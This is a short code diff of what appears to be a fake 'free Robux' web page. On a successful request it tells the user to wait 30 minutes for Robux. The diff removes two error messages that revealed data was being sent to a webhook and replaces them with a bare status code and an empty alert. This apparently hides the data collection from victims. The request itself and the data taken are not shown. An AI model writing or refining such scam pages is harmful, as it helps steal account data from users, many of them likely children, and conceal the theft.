@@ -163,12 +163,12 @@
                 if (response.ok) {
                     alert('Thank you! Make sure to wait 30 minutes to get your ' + h1i2j3 + ' Robux.');
                 } else {
-                    alert('Failed to send data to webhook. Status: ' + response.status);
+                    alert(response.status);
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('An error occurred while trying to send data to the webhook. Please check your network connection and try again.');
+                alert('');
             });
         }
 
